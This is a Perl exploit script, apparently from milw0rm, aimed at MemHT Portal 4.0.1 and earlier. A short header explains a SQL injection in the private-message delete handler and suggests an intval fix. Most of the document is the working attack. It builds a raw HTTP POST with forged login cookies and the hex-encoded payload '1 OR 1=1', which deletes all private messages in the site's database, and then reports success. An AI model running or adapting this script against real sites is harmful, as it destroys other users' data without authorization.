#!/usr/bin/perl
# MemHT Portal <= 4.0.1 (pvtmsg) Delete All Private Messages Exploit
# by yeat - staker[at]hotmail[dot]it

<<Details;
   
   Note:

   1- works regardless of php.ini settings. 
   2- blind sql injection benchmark() method is possible.
   3- don't add me on msn messenger.
   4- Thanks to evilsocket && Sir Dark.
   5- MemHT is a good content management system but it has some security problem.
   6- http://milw0rm.com/exploits/7859 
      security patch: http://www.memht.com/forum_thread_17756_FixPatch-4-0-1.html
   
   /pages/pvtmsg/index.php / Line: 851 -867
 
   <?php

      
      }

      break;
      
      case "deleteSelected":

        if (isset($_POST['deletenewpm'])) {
        foreach ($_POST['deletenewpm'] as $value) {
          $dblink->query("DELETE FROM memht_pvtmsg WHERE id=$value");
          }
       }
       if (isset($_POST['deletepm'])) {
         foreach ($_POST['deletepm'] as $value) {
          $dblink->query("DELETE FROM memht_pvtmsg WHERE id=$value");
         }
       }

    ?>
    
  
  ok then foreach ($_POST['deletenewpm'] as $value)
  
  deletenewpm[]= $value ;) so if we send a evil code like this:
  1 OR 1=1 we'll delete all messages from mysql database
  
  Possible Fix:
  
  Line: 859 && 864

  Edit $dblink->query("DELETE FROM memht_pvtmsg WHERE id=$value"); 
  Fix: $dblink->query("DELETE FROM memht_pvtmsg WHERE id=".intval($value));



  regards :)



Details


use IO::Socket;
use Digest::MD5('md5_hex');

our ($host,$path,$id,$username,$password) = @ARGV;


if (@ARGV != 5) {
   
   print "\n+--------------------------------------------------------------------+\r",
         "\n| MemHT Portal <= 4.0.1 (pvtmsg) Delete All Private Messages Exploit |\r",
         "\n+--------------------------------------------------------------------+\r",
         "\nby yeat - staker[at]hotmail[dot]it\n",
         "\nUsage     + perl $0 [host] [path] [id] [username] [password]\r",
         "\nHost      + localhost\r",
         "\nPath      + /MemHT\r",
         "\nID        + your user id\r",
         "\nPassword  + your password\n";
   exit;
}   

else {
   
   my $html = undef;
   my $sock = new IO::Socket::INET(
                                    PeerAddr => $host,
                                    PeerPort => 80,
                                    Proto    => 'tcp',
                                  ) or die $!;
                                      
   my $post = "deletenewpm[]=\x31\x20\x4F\x52\x20\x31\x3D\x31".
              "&Submit.x=34".
              "&Submit.y=9";
   
   my $auth = cookies();
   
   my $data = "POST /$path/index.php?page=pvtmsg&op=deleteSelected HTTP/1.1\r\n".
              "Host: $host\r\n".
              "User-Agent: Lynx (textmode)\r\n".
              "Cookie: $auth\r\n".
              "Content-Type: application/x-www-form-urlencoded\r\n".
              "Content-Length: ".length($post)."\r\n\r\n$post\r\n\r\n".
              "Connection: close\r\n\r\n";
              
   $sock->send($data);    
   
   while (<$sock>) {
      $html .= $_;
   }           
   
   if ($html =~ /Private Messages/i) {
      print "Exploit successfull,all messages deleted.\n";
   }
   else {
      print "Exploit failed!\n";
   }      
}


sub cookies
{
    $username = md5_hex($username);   
    $password = md5_hex($password);
    
    return "login_user=$id#$username#$password";
}

# milw0rm.com [2009-02-16]
